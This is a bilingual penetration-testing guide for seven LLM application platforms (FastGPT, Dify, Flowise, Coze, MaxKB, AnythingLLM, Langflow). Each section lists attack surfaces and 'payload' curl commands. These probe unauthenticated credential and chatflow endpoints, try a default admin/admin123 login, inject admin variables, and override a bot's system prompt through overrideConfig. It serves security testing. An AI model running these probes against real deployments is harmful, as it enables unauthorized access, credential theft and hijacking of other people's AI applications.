# 多平台差异化测试指南 / Platform-Specific Testing Guide

## FastGPT

**架构特征：** Next.js + Chakra UI 前端，Node.js 后端，MongoDB/PostgreSQL，支持工作流编排

**专属攻击面：**
- `getInitData` 泄露系统配置（systemTitle, feConfigs, subPlans）
- `detail:true` 参数暴露完整工作流节点、推理链、RAG引用
- `stream:true + detail:true` SSE流中泄露 `reasoning_content` 和 `flowNodeStatus`
- 分享链接体系：shareId + outLinkUid 组合身份
- 工作流节点：意图理解 → 知识库搜索 → AI对话（节点名称泄露）
- 知识库管理API：dataset/collection/source 三级结构

**专属Payload：**
```bash
# 配置泄露
curl -s 'TARGET/api/common/system/getInitData'

# 完整工作流暴露
curl -s 'TARGET/api/v2/chat/completions' \
  -d '{"messages":[{"role":"user","content":"你好"}],"shareId":"ID","stream":false,"detail":true}'

# SSE推理泄露
curl -s 'TARGET/api/v2/chat/completions' \
  -d '{"messages":[{"role":"user","content":"QUERY"}],"shareId":"ID","stream":true,"detail":true}'

# 变量注入
curl -s 'TARGET/api/v2/chat/completions' \
  -d '{"messages":[...],"variables":{"debug":true,"admin":true}}'
```

**重点检查：** 分享链接权限边界、工作流节点泄露、RAG ACL

---

## Dify

**架构特征：** Flask/Next.js，PostgreSQL + Redis + Weaviate/Qdrant，支持Agent/Workflow两种模式

**专属攻击面：**
- Console API vs Service API 权限分离
- `/v1/parameters` 暴露应用配置
- 对话变量 `conversation_id` 可能跨会话
- 知识库API：datasets → documents → segments 三级
- 工具市场（Marketplace）第三方工具信任
- SandboxJS/Python代码执行节点

**专属Payload：**
```bash
# 应用参数暴露
curl -s 'TARGET/v1/parameters' -H 'Authorization: Bearer API_KEY'

# 知识库枚举
curl -s 'TARGET/v1/datasets' -H 'Authorization: Bearer API_KEY'
curl -s 'TARGET/v1/datasets/{id}/documents' -H 'Authorization: Bearer API_KEY'

# Console API（管理面板）
curl -s 'TARGET/console/api/apps' -H 'Authorization: Bearer CONSOLE_TOKEN'

# 消息历史
curl -s 'TARGET/v1/messages?conversation_id=ID' -H 'Authorization: Bearer API_KEY'

# 文件上传
curl -s 'TARGET/v1/files/upload' -F 'file=@test.txt' -H 'Authorization: Bearer API_KEY'
```

**重点检查：** Console/Service API权限边界、conversation_id枚举、代码执行沙箱

---

## Flowise

**架构特征：** Node.js + Express，LangChain为核心，SQLite/MySQL/PostgreSQL

**专属攻击面：**
- 默认无认证的管理API
- `/api/v1/chatflows` 暴露所有聊天流配置（含API密钥）
- `/api/v1/credentials` 可能暴露凭据（CVE记录）
- Canvas编辑器路径穿越
- 自定义工具代码注入
- Docker Compose默认配置通常过于宽松

**专属Payload：**
```bash
# 聊天流列表（常常无需认证）
curl -s 'TARGET/api/v1/chatflows'

# 凭据列表（高危）
curl -s 'TARGET/api/v1/credentials'

# 特定聊天流详情（含配置和密钥）
curl -s 'TARGET/api/v1/chatflows/{id}'

# 文档存储
curl -s 'TARGET/api/v1/document-store/loaders'

# 预测API
curl -s 'TARGET/api/v1/prediction/{chatflow_id}' \
  -d '{"question":"test","overrideConfig":{"systemMessage":"NEW_PROMPT"}}'
```

**重点检查：** 默认无认证访问、凭据API暴露、overrideConfig参数注入

---

## Coze / 扣子

**架构特征：** 字节跳动闭源平台，React + Arco Design前端，支持插件、工作流、知识库

**专属攻击面：**
- Bot发布后的权限控制（公开bot能力发现）
- 插件市场第三方插件信任
- 工作流节点（代码节点、HTTP节点）
- 知识库 → Bot绑定的权限边界
- 国内版(coze.cn) vs 海外版(coze.com) API差异
- 长期记忆(Long-term Memory)功能的隐私风险

**专属Payload：**
```bash
# Bot信息（API方式）
curl -s 'https://api.coze.cn/v3/bots/{bot_id}' \
  -H 'Authorization: Bearer TOKEN'

# 对话
curl -s 'https://api.coze.cn/v3/chat' \
  -d '{"bot_id":"BOT_ID","user_id":"test","stream":false,
       "additional_messages":[{"role":"user","content":"test"}]}'

# 知识库
curl -s 'https://api.coze.cn/v3/datasets' -H 'Authorization: Bearer TOKEN'

# 工作流
curl -s 'https://api.coze.cn/v3/workflows/runs' \
  -d '{"workflow_id":"WF_ID","parameters":{}}'
```

**重点检查：** 公开Bot能力边界、插件权限、长期记忆跨会话泄露

---

## MaxKB

**架构特征：** Python (Django) 后端，Vue + Element Plus 前端，PostgreSQL + pgvector

**专属攻击面：**
- 默认管理员账户弱密码
- API认证bypass（早期版本CVE）
- 知识库文件直接下载
- PostgreSQL/pgvector直接查询
- 嵌入式对话不验证来源

**专属Payload：**
```bash
# 默认登录
curl -s 'TARGET/api/user/login' \
  -d '{"username":"admin","password":"admin123"}'

# 应用列表
curl -s 'TARGET/api/application/' -H 'Authorization: Bearer TOKEN'

# 知识库
curl -s 'TARGET/api/dataset/' -H 'Authorization: Bearer TOKEN'
```

**重点检查：** 默认凭据、API认证、文件下载权限

---

## AnythingLLM

**架构特征：** Node.js，多模型支持，本地部署为主

**专属攻击面：**
- `/api/v1/system/health` 系统信息泄露
- Workspace隔离不严格
- 嵌入端点可能无认证
- 本地文件系统访问
- 多用户模式下的权限边界

**专属Payload：**
```bash
# 系统健康（信息泄露）
curl -s 'TARGET/api/v1/system/health'

# 工作区
curl -s 'TARGET/api/v1/workspaces' -H 'Authorization: Bearer TOKEN'

# 嵌入式聊天（可能无需认证）
curl -s 'TARGET/api/v1/workspace/{slug}/chat' \
  -d '{"message":"test","mode":"chat"}'
```

**重点检查：** 嵌入端点认证、工作区隔离、系统信息泄露

---

## Langflow

**架构特征：** Python (FastAPI)，React前端，可视化LangChain流编辑器

**专属攻击面：**
- 流定义导出/导入（含密钥）
- API端点默认无认证
- 自定义Python组件代码注入
- 数据库配置泄露

**专属Payload：**
```bash
# 流列表
curl -s 'TARGET/api/v1/flows'

# 运行流
curl -s 'TARGET/api/v1/run/{flow_id}' \
  -d '{"input_value":"test"}'

# 导出流（可能含密钥）
curl -s 'TARGET/api/v1/flows/{id}/download'
```

**重点检查：** 流导出含密钥、API认证、代码注入

---

## 跨平台通用测试矩阵

| 测试项 | FastGPT | Dify | Flowise | Coze | MaxKB | AnythingLLM | Langflow |
|---|---|---|---|---|---|---|---|
| 默认无认证API | - | - | ⚠️高 | - | ⚠️ | ⚠️ | ⚠️ |
| 配置/密钥泄露 | 中 | 中 | 高 | 低 | 中 | 中 | 高 |
| 知识库ACL | 高 | 高 | 中 | 中 | 高 | 中 | 低 |
| 工作流节点泄露 | 高 | 中 | 低 | 中 | 低 | 低 | 中 |
| 代码执行沙箱 | 低 | 高 | 中 | 高 | 低 | 低 | 高 |
| 分享链接安全 | 高 | 中 | 低 | 高 | 低 | 中 | 低 |
| 推理token泄露 | 高 | 中 | 低 | 低 | 低 | 低 | 低 |
| 插件/工具安全 | 中 | 高 | 高 | 高 | 低 | 中 | 高 |
